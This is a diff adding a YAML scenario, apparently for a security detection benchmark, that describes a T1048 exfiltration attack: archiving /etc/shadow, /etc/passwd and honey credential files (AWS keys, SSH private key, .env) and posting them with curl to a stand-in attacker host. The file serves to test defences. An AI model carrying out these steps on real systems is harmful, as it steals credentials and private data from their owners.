@@ -1,0 +1,13 @@
+id: t1048-exfiltration-http
+name: Sensitive files archived and posted over HTTP
+kind: attack
+tactic: exfiltration
+technique: T1048
+description: >-
+  Archives /etc/passwd, /etc/shadow and the honey credential files
+  (/root/.aws/credentials, /root/.ssh/id_rsa, /opt/app/.env) into
+  /tmp/bench-exfil-<marker>.tar.gz and uploads it with curl --data-binary to
+  http://$BENCH_ATTACKER:8080/upload, which discards the data. The archive is removed
+  afterwards.
+timeout: 30
+requires: [attacker]
